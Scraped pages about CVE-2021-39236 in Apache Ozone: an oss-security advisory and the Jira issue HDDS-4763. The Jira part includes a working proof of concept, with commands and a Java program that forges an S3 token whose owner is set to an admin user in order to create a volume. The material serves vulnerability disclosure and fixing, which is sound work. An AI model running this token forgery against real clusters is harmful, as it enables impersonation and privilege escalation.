=== Content from www.openwall.com_fe065284_20250114_200316.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <6b49338a-7118-f9d8-58a0-99ab5fdcdefa@apache.org>
Date: Thu, 18 Nov 2021 23:07:24 +0000
From: Siddharth Wagle <swagle@...che.org>
To: oss-security@...ts.openwall.com
Subject: CVE-2021-39236: Apache Ozone: Owners of the S3 tokens are not
 validated

Description:

Authenticated users with valid Ozone S3 credentials can create specific OM requests, impersonating any other user.

This issue is being tracked as HDDS-4763

Mitigation:

Upgrade to Apache Ozone release version 1.2.0

Credit:

Apache Ozone would like to thank Marton Elek for reporting this issue.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from mail-archives.apache.org_3e4ec901_20250114_200317.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from issues.apache.org_154b75ba_20250114_200316.html ===


[Log in](/jira/login.jsp?os_destination=%2Fbrowse%2FHDDS-4763)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoading…[![ASF JIRA](/jira/s/xd97tr/820010/13pdxe5/_/jira-logo-scaled.png)](https://issues.apache.org/jira/secure/MyJiraHome.jspa)

* [Dashboards](/jira/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/jira/browse/HDDS "View recent projects and browse a list of projects")
* [Issues](/jira/issues/ "Search for issues and view recent issues")

* [Help](https://docs.atlassian.com/jira/jcore-docs-0820/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-0820/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/jira/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/jira/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/jira/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/jira/login.jsp?os_destination=%2Fbrowse%2FHDDS-4763)

Public signup for this instance is **disabled**. Go to our [Self serve sign up page](https://selfserve.apache.org/jira-account.html) to request an account. Report potential security issues [privately](https://apache.org/security/#reporting-a-vulnerability)

![Uploaded image for project: 'Apache Ozone'](https://issues.apache.org/jira/secure/projectavatar?pid=12321922&avatarId=36746)

1. [Apache Ozone](/jira/browse/HDDS)
2. [HDDS-4763](/jira/browse/HDDS-4763)

# Owner field of S3AUTHINFO type delegation token should be validated

[Log In](/jira/login.jsp?os_destination=%2Fbrowse%2FHDDS-4763 "Log In")Export

XMLWordPrintableJSON
#### Details

* **Type:**
  ![](/jira/secure/viewavatar?size=xsmall&avatarId=21133&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Status:**
  Resolved
* **Priority:**
  ![](/jira/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run") Blocker
* **Resolution:**
  Fixed
* **Affects Version/s:**
  None
* **Fix Version/s:**
  [1.1.0](/jira/issues/?jql=project+%3D+HDDS+AND+fixVersion+%3D+1.1.0 "1.1.0 Everglades")
* **Component/s:**
  None
* **Labels:**
  + [pull-request-available](/jira/issues/?jql=labels+%3D+pull-request-available "pull-request-available")
#### Description

Delegation token of Ozone has two flavor:

1. delegation token (based public key infrastructure provided by SCM CA)

2. s3 token

S3 token includes all the information which is required to validate a S3 HTTP request: aws access key id, string2sign, signature. OM can check the signature based on all this information which are stored in the OzoneTokenInfo.

When the request is authenticated the owner field is used for all the following authentication. But the content of the follower field is not validated. It's filled by the S3g but any client can create a custom request where the Owner field contains a custom string.

1. To reproduce start an ozonesecure cluster where testuser2 is not an admin. (The easiest way to achieve this is removing the hadoop.security.auth\_to\_local settings, as in our ozonesecure environment all users are mapped to local root which is admin)

To make the test easier, groups can also be turned off:

```

 <property>
    <name>hadoop.security.group.mapping</name>
    <value>org.apache.hadoop.security.NullGroupsMapping</value>
  </property>

```

2. Check if testuser2 is not an admin:

```

kinit -kt /etc/security/keytabs/testuser2.keytab testuser2/scm

klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: testuser2/scm@EXAMPLE.COM

Valid starting     Expires            Service principal
01/29/21 13:27:03  01/30/21 13:27:03  krbtgt/EXAMPLE.COM@EXAMPLE.COM
	renew until 02/05/21 13:27:03

ozone sh volume create /vol3
PERMISSION_DENIED User testuser2/scm@EXAMPLE.COM doesn't have CREATE permission to access volume vol3 null null

```

3. To create a s3 type delegation token we need valid string2sign and signature strings.

```

ozone s3 getsecret

```

Set the environment variables:

```

AWS_ACCESS_KEY_ID=...
AWS_SECRET_ACCESS_KEY=....

```

Try to create a bucket (will be denied) with --debug flag:

```

aws s3api --debug --endpoint=http://localhost:9878 create-bucket --bucket=bucket1

```

Copy the signature and string2sign from the output:

```

2021-01-29 15:03:52,269 - MainThread - botocore.auth - DEBUG - StringToSign:
AWS4-HMAC-SHA256
20210129T140352Z
20210129/us-west-1/s3/aws4_request
ff6c0c767b0292cf3459d02ae1199d4c7786f3cca2f383a46b442f19d964d996
2021-01-29 15:03:52,269 - MainThread - botocore.auth - DEBUG - Signature:
9830423f18ac1f90ec658d1b5c47bdd7765d67fdc0dc67393c162627bfa45789

```

And execute a java app:

```

  public static void main(String[] args) throws Exception {
    OzoneConfiguration conf = new OzoneConfiguration();
    conf.set("ozone.om.address", "192.168.32.6");

    String awsAccessId = "testuser2/scm@EXAMPLE.COM";

    UserGroupInformation.setConfiguration(conf);

    UserGroupInformation remoteUser =
        UserGroupInformation.createRemoteUser(awsAccessId, AuthMethod.TOKEN);

    final Text omService = SecurityUtil.buildTokenService(OmUtils.
        getOmAddressForClients(conf));
    OzoneTokenIdentifier identifier = new OzoneTokenIdentifier();
    identifier.setTokenType(S3AUTHINFO);
    identifier.setStrToSign("AWS4-HMAC-SHA256\n"
        + "20210129T133557Z\n"
        + "20210129/us-west-1/s3/aws4_request\n"
        + "8fc985d9c7442c33d6f146ab123de49b18c83c4c6ccdfd182f10fc78691bdd53");
    identifier.setSignature(
        "044cf03375ea10b3e454b16887a1f5ce6ebb14d45b506dd7ac5e02fd0179ba7b");
    identifier.setAwsAccessId(awsAccessId);
    identifier.setOwner(new Text("testuser/scm@EXAMPLE.COM"));
    Token<OzoneTokenIdentifier> token = new Token(identifier.getBytes(),
        identifier.getSignature().getBytes(UTF_8),
        identifier.getKind(),
        omService);

    remoteUser.addToken(token);

    OzoneClient client = remoteUser.doAs(
        (PrivilegedExceptionAction<OzoneClient>) () -> OzoneClientFactory.getRpcClient(conf));
    client.getObjectStore().createVolume("vol2");

  }

```

As a result /vol2 is created even if testuser2 is not an admin. Note: testuser IS an admin and setOwner used testuser instead of testuser2.

A quick fix is to validate the owner field. A proper, long-term fix is disabling the s3 auth token type for client2server communication which can be done with [~~HDDS-4440~~](https://issues.apache.org/jira/browse/HDDS-4440 "Design Doc: Use per-request authentication and persistent connections between S3g and OM").

#### Attachments

#### Issue Links

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[GitHub Pull Request #1871](https://github.com/apache/ozone/pull/1871)

#### Activity

#### People

Assignee:

![elek](https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452)
Marton Elek

Reporter:

![elek](https://issues.apache.org/jira/secure/useravatar?size=small&avatarId=10452)
Marton Elek

Votes:
0
Vote for this issue

Watchers:
2
Start watching this issue

#### Dates

Created:

29/Jan/21 14:06

Updated:

03/Feb/21 01:30

Resolved:

02/Feb/21 18:53

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/jira/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/jira/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for Apache Software Foundation. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)


